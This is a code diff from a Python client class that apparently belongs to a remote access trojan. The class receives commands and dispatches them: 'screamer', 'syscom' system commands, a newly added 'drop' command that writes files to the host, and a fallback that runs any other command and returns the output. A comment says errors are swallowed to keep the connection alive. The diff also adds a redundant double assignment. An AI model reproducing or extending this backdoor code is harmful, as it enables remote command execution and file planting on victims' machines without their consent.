@@ -68,7 +68,8 @@ class Client:
             return base64.b64encode(file.read())
 
     # Writing files, decode the b64 from the above function
-    def writeFile(self, path, content):
+    @staticmethod
+    def writeFile(path, content):
         """Записывает файл с кодирование"""
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
@@ -116,9 +117,11 @@ class Client:
                         command_response = commands.screamer()
                     case "syscom":
                         command_response = commands.sys_command(command[1:])
+                    case "drop":
+                        command_response = commands.drop(command[1], command[2])
                     case _:
                         convCommand = self.arrayToString(command)
-                        command_response = self.runCommand(convCommand).decode()
+                        command_response = command_response = self.runCommand(convCommand).decode()
             # Whole error handling, bad practice but required to keep connection
             except Exception as e:
                 command_response = (
